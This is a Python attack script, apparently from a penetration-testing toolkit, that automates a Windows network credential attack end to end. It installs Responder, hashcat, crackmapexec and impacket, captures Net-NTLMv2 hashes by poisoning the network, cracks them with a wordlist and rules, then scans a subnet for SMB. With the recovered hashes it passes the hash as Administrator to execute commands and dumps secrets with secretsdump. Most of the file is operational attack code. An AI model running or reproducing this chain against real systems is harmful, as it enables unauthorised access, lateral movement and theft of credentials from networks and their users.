######################################################################################################################################################################################################################
# Python script that installs required tools, checks for and attempts to install responder, hashcat, and crackmap, attempts to hijack net-ntlm hashes off the network and recover using hashcat, formats gleened representations to NTLM. 
# And gives a count of successfully recovered passwords. Permissions and dependencies are required to be installed on the Linux machine
# Bash: python3 capture_and_pass_hash.py. Ensure wordlist & rule file is accessible in the same folder, or specify the paths. Special thanks to StealthSploit for the robust rule file. https://github.com/stealthsploit/OneRuleToRuleThemStill
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import subprocess
import re
import sys
import os
import hashlib
import time
from netaddr import IPNetwork
    
# Banner
def display_splash_screen():
    splash = """
 
    
_________                  __                           ____    ________________________ ___               _____  ____.____   __________  ___ ___    _____           _______  ____ 
\_   ___ \_____   ______ _/  |_ __ _________   ____    /  _ \   \______   \__    ___/   |   \             /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
/    \  \/\__  \  \____ \\   __\  |  \_  __ \_/ __ \   >  _ </\  |     ___/ |    | /    ~    \  ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
\     \____/ __ \_|  |_> >|  | |  |  /|  | \/\  ___/  /  <_\ \/  |    |     |    | \    Y    / /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 \______  (____  /|   __/ |__| |____/ |__|    \___  > \_____\ \  |____|     |____|  \___|_  /           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
        \/     \/ |__|                            \/         \/                           \/                 |__|             \/               \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("Capture & PTH 41PH4-01\n")


def is_tool_installed(tool_name):
    """Check if a tool is installed by running 'which' command."""
    result = subprocess.run(['which', tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def install_tools():
    tools = {
        "responder": "git+https://github.com/lgandx/Responder.git",
        "hashcat": "hashcat",
        "crackmapexec": "crackmapexec",
        "impacket": "impacket",
    }

    for tool, install_command in tools.items():
        if is_tool_installed(tool):
            print(f"[+] {tool} is already installed.")
        else:
            try:
                if tool == "responder":
                    subprocess.check_call([sys.executable, "-m", "pip", "install", install_command])
                elif tool == "hashcat":
                    subprocess.check_call(["sudo", "apt-get", "install", "-y", "hashcat"])
                else:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", install_command])
                print(f"[+] {tool} installed successfully.")
            except subprocess.CalledProcessError:
                print(f"[-] Failed to install {tool}.")
                sys.exit(1)

def capture_hashes():
    print("[+] Starting Responder to capture hashes...")
    responder_process = subprocess.Popen(['sudo', 'responder', '-I', 'eth0', '-wr', 'responder.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return responder_process

def stop_responder(responder_process):
    print("[+] Stopping Responder...")
    responder_process.terminate()

def extract_hashes():
    print("[+] Extracting captured hashes from Responder logs...")
    hashes = []
    responder_log_path = '/usr/share/responder/logs/Responder-Session.log'
    if not os.path.exists(responder_log_path):
        print("[-] Responder log file not found.")
        return hashes

    with open(responder_log_path, 'r') as log_file:
        for line in log_file:
            if 'NTLMv2-SSP Hash' in line:
                hash_line = line.strip()
                match = re.search(r'NTLMv2-SSP Hash\s*:\s*(.*)', hash_line)
                if match:
                    ntlm_hash = match.group(1)
                    hashes.append(ntlm_hash)
                else:
                    print(f"[-] No NTLMv2-SSP hash found in line: {line.strip()}")
    return hashes

def crack_hash(net_ntlm_hash):
    print(f"[+] Cracking hash: {net_ntlm_hash}")
    
    # Output file for captured hashes
    hash_file = "netntlmv2.txt"
    with open(hash_file, "w") as file:
        file.write(net_ntlm_hash + "\n")

    # Note: Adjust the paths to hashcat, wordlist, and rules file as needed
    hashcat_command = [
        "hashcat",
        "-m", "5600",
        "-w", "3",  # Workload profile 3
        "-a", "0",  # Attack mode 0 (dictionary attack)
        hash_file,
        "./rockyou.txt",  # Path to your wordlist in the same directory
        "--rules-file", "./one-rule-to-rule-them-all.rule",  # Path to your rules file in the same directory
        "--status",  # Enables status output
        "--status-timer", "10"  # Update status every 10 seconds
    ]
    
    hashcat_process = subprocess.Popen(hashcat_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    try:
        while True:
            line = hashcat_process.stdout.readline()
            if not line:
                break
            print(line.strip())
            if "Exhausted" in line or "Cracked" in line:
                break
            time.sleep(1)  # Sleep for a second before checking the next line
        
        hashcat_process.wait()
    except KeyboardInterrupt:
        hashcat_process.terminate()
        print("[-] Hashcat process terminated by user.")
    
    # Show cracked passwords
    show_command = [
        "hashcat",
        "-m", "5600",
        hash_file,
        "--show"
    ]
    result = subprocess.run(show_command, capture_output=True, text=True)
    cracked = result.stdout.strip().split(':')
    if len(cracked) > 2:
        password = cracked[2]
        return password
    else:
        return None

def get_ntlm_hash(password):
    ntlm_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
    return ntlm_hash

def run_crackmapexec(target, ntlm_hash):
    username = 'Administrator'  # Default username, replace as needed
    command = [
        "crackmapexec",
        "smb",
        target,
        "-u",
        username,
        "-H",
        ntlm_hash,
        "--exec-method",
        "smbexec"
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def run_secretsdump(target, username, ntlm_hash):
    command = [
        "secretsdump.py",
        f"{username}@{target}",
        "-hashes",
        f"{ntlm_hash}:{ntlm_hash}"
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def scan_subnet(subnet):
    print(f"[+] Scanning subnet: {subnet}")
    for ip in IPNetwork(subnet):
        ip = str(ip)
        print(f"[+] Scanning {ip}")
        command = [
            "crackmapexec",
            "smb",
            ip
        ]
        result = subprocess.run(command, capture_output=True, text=True)
        if "SMB" in result.stdout:
            print(f"[+] Found SMB service on {ip}")
            return ip
    return None

def main():
    # Install dependencies
    install_tools()

    # Start Responder to capture hashes
    responder_process = capture_hashes()

    # Let Responder run for a period to capture hashes
    try:
        input("Press Enter to stop Responder and process captured hashes...")
    except KeyboardInterrupt:
        pass

    # Stop Responder
    stop_responder(responder_process)

    # Extract captured hashes
    net_ntlm_hashes = extract_hashes()
    if not net_ntlm_hashes:
        print("[-] No hashes captured. Exiting.")
        return

    # Crack Net-NTLMv2 hashes to get NTLM hashes
    cracked_passwords = [crack_hash(hash) for hash in net_ntlm_hashes if crack_hash(hash)]
    cracked_count = len(cracked_passwords)
    print(f"[+] Number of passwords cracked: {cracked_count}")

    if cracked_count == 0:
        print("[-] Failed to crack any Net-NTLMv2 hashes.")
        return

    ntlm_hashes = [get_ntlm_hash(password) for password in cracked_passwords if password]

    # Run crackmapexec or secretsdump on the subnet
    subnet = "192.168.1.0/24"  # Change to your subnet
    target_ip = scan_subnet(subnet)

    if target_ip:
        print(f"[+] Target machine found at {target_ip}")
        for ntlm_hash in ntlm_hashes:
            print(f"[+] Using NTLM hash: {ntlm_hash}")
            # Run crackmapexec using captured NTLM hashes
            output = run_crackmapexec(target_ip, ntlm_hash)
            if output:
                print("[+] Command output:")
                print(output)
            else:
                print("[-] Failed to execute command on target")
            
            # Run secretsdump if the target is accessible
            secrets_output = run_secretsdump(target_ip, 'Administrator', ntlm_hash)
            if secrets_output:
                print("[+] Secretsdump output:")
                print(secrets_output)
            else:
                print("[-] Failed to dump secrets")

if __name__ == "__main__":
    main()
